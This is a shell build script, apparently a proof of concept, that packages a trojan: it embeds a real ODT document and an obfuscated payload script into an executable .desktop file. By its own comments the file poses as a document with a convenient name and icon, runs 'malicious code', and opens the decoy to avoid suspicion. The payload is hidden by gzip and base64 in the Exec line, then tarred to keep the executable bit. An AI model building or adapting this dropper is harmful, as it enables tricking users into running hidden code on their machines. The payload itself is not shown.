#! /bin/sh

base_name='chaton-mignon'

cur_dir="$(pwd)"
src_dir="${cur_dir}/src"
work_dir="${cur_dir}/work"
build_dir="${cur_dir}/build"
document_file="${base_name}.odt"
document_dir="${document_file}.d"
script_file="${base_name}.sh"
script_template="${script_file}.template"
script_strip="${script_file}.stripped"
desktop_file="${document_file}.desktop"
desktop_template="${desktop_file}.template"
archive_file="${base_name}.tgz"

mkdir -p "${work_dir}"
mkdir -p "${build_dir}"

write_document () {
	## create an odt file from a directory
	## it's a standard pkzip file with a different name
	cd "${src_dir}/${document_dir}"
	zip "${work_dir}/${document_file}" $(find) >/dev/null
}

encode_document () {
	## encode the file to base64 after creation
	write_document
	base64 < "${work_dir}/${document_file}"
}

write_script () {
	## write a script that will be launched by the desktop file
	## that script will execute some malicious code
	## and open a real document to not let the user become suspicious
	cat > "${work_dir}/${script_file}" <<-EOF
	$(sed '/^<DOCUMENT>$/, $ d' "${src_dir}/${script_template}")
	$(encode_document)
	$(sed '1,/^<DOCUMENT>$/d' "${src_dir}/${script_template}")
	EOF
}

strip_script () {
	write_script
	sed -e 's/##.*//' "${work_dir}/${script_file}" | grep -v '^$' \
	> "${work_dir}/${script_strip}"
}

encode_script () {
	## compress and encode the script to base64 for inclusion
	## in the desktop file
	strip_script
	gzip < "${work_dir}/${script_strip}" | base64 | tr -d '\n'
}

write_desktop () {
	## write a standard desktop file displaying a convenient name
	## and a convenient document icon
	cat > "${work_dir}/${desktop_file}" <<-EOF
	$(sed '/^Exec=<ACTION>$/, $ d' "${src_dir}/${desktop_template}")
	Exec=/bin/sh -c "echo '$(encode_script)' | base64 -d | gzip -d | sh"
	$(sed '1,/^Exec=<ACTION>$/d' "${src_dir}/${desktop_template}")
	EOF

	## set executable bit on that desktop file
	chmod +x "${work_dir}/${desktop_file}"
}

write_archive () {
	## pack the desktop file in a tarball to keep permission
	## this tarball can be compressed
	write_desktop
	cd "${work_dir}"
	tar -czf "${build_dir}/${archive_file}" "${desktop_file}"
}

if [ -f 'build.sh' ]
then
	printf 'ERROR: this script must be called from parent dir\n'
	exit
fi

conditional_rm () {
	if [ -d "${1}" ]
	then
		rmdir "${1}"
	elif [ -e "${1}" ]
	then
		rm "${1}"
	fi
}

case "${1}" in
	'-c'|'--clean')
		conditional_rm "${work_dir}/${document_file}"
		conditional_rm "${work_dir}/${desktop_file}"
		conditional_rm "${work_dir}/${script_file}"
		conditional_rm "${work_dir}/${script_strip}"
		conditional_rm "${work_dir}/"
		conditional_rm "${build_dir}/${archive_file}"
		conditional_rm "${build_dir}/${desktop_file}"
		conditional_rm "${build_dir}/"
	;;
	'')
		write_archive
	;;
esac

#EOF
